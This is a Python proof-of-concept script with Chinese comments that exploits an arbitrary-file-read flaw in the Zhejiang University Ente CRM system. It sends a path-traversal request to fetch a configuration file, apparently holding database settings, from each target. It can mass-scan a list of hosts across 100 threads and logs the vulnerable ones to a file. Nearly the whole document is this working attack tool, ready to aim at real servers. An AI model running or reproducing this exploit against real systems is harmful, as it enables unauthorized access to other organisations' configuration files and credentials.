import sys
import requests
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


# 定义程序的横幅
def banner():
    test = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei                                    
"""
    logging.info(test)


# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="浙大恩特客户资源管理系统 任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan'
    url = target + payload_url
    headers = {
        'Accept-Encoding': 'gzip,deflate,br',
        'Accept': '*/*',
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36',
        'Connection': 'close',
        'Cache-Control': 'max-age=0'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.get(url=url, headers=headers, timeout=5, verify=False, proxies=proxies)

        if res.status_code == 200 and "db" in res.text:
            logging.info(f"{GREEN}[+]该网站存在任意文件读取漏洞，url为{target}{RESET}")
            with open("zhedare.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            logging.info(f"[-]该网站不存在任意密码读取漏洞, url为{target}")

    except Exception as e:
        logging.error(f"[*]该网站无法访问，url为{target}, 错误信息: {e}")


# 程序入口点
if __name__ == '__main__':
    main()
